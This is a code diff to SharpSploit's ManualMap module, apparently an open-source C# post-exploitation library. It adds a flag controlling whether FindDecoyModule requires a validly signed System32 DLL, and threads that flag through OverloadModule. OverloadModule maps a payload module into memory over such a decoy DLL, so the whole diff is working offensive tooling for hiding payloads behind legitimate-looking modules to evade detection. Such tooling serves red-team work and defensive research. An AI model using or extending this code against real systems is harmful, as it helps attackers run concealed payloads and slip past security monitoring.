@@ -16,10 +16,11 @@ namespace SharpSploit.Execution.ManualMap
         /// </summary>
         /// <author>The Wover (@TheRealWover)</author>
         /// <param name="MinSize">Minimum module byte size.</param>
+        /// <param name="LegitSigned">Whether to require that the module be legitimately signed.</param>
         /// <returns>
         /// String, the full path for the candidate module if one is found, or an empty string if one is not found.
         /// </returns>
-        public static string FindDecoyModule(long MinSize)
+        public static string FindDecoyModule(long MinSize, bool LegitSigned = true)
         {
             string SystemDirectoryPath = Environment.GetEnvironmentVariable("WINDIR") + Path.DirectorySeparatorChar + "System32";
             List<string> files = new List<string>(Directory.GetFiles(SystemDirectoryPath, "*.dll"));
@@ -31,18 +32,31 @@ namespace SharpSploit.Execution.ManualMap
                 }
             }
 
+            //Pick a random candidate that meets the requirements
+
             Random r = new Random();
+            //List of candidates that have been considered and rejected
             List<int> candidates = new List<int>();
             while (candidates.Count != files.Count)
             {
+                //Iterate through the list of files randomly
                 int rInt = r.Next(0, files.Count);
                 string currentCandidate = files[rInt];
 
+                //Check that the size of the module meets requirements
                 if (candidates.Contains(rInt) == false &&
-                    new FileInfo(currentCandidate).Length >= MinSize &&
-                    Misc.Utilities.FileHasValidSignature(currentCandidate) == true)
+                    new FileInfo(currentCandidate).Length >= MinSize)
                 {
-                    return currentCandidate;
+                    //Check that the module meets signing requirements
+                    if (LegitSigned == true)
+                    {
+                        if (Misc.Utilities.FileHasValidSignature(currentCandidate) == true)
+                            return currentCandidate;
+                        else
+                            candidates.Add(rInt);
+                    }
+                    else
+                        return currentCandidate;
                 }
                 candidates.Add(rInt);
             }
@@ -57,7 +71,7 @@ namespace SharpSploit.Execution.ManualMap
         /// <param name="PayloadPath">Full path to the payload module on disk.</param>
         /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
         /// <returns>PE.PE_MANUAL_MAP</returns>
-        public static PE.PE_MANUAL_MAP OverloadModule(string PayloadPath, string DecoyModulePath = null)
+        public static PE.PE_MANUAL_MAP OverloadModule(string PayloadPath, string DecoyModulePath = null, bool LegitSigned = true)
         {
             // Verify process & architecture
             bool isWOW64 = DynamicInvoke.Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
@@ -73,7 +87,7 @@ namespace SharpSploit.Execution.ManualMap
             }
             byte[] Payload = File.ReadAllBytes(PayloadPath);
 
-            return OverloadModule(Payload, DecoyModulePath);
+            return OverloadModule(Payload, DecoyModulePath, LegitSigned);
         }
 
         /// <summary>
@@ -84,7 +98,7 @@ namespace SharpSploit.Execution.ManualMap
         /// <param name="Payload">Full byte array for the payload module.</param>
         /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
         /// <returns>PE.PE_MANUAL_MAP</returns>
-        public static PE.PE_MANUAL_MAP OverloadModule(byte[] Payload, string DecoyModulePath = null)
+        public static PE.PE_MANUAL_MAP OverloadModule(byte[] Payload, string DecoyModulePath = null, bool LegitSigned = true)
         {
             // Verify process & architecture
             bool isWOW64 = DynamicInvoke.Native.NtQueryInformationProcessWow64Information((IntPtr)(-1));
@@ -108,7 +122,7 @@ namespace SharpSploit.Execution.ManualMap
             }
             else
             {
-                DecoyModulePath = FindDecoyModule(Payload.Length);
+                DecoyModulePath = FindDecoyModule(Payload.Length, LegitSigned);
                 if (string.IsNullOrEmpty(DecoyModulePath))
                 {
                     throw new InvalidOperationException("Failed to find suitable decoy module.");
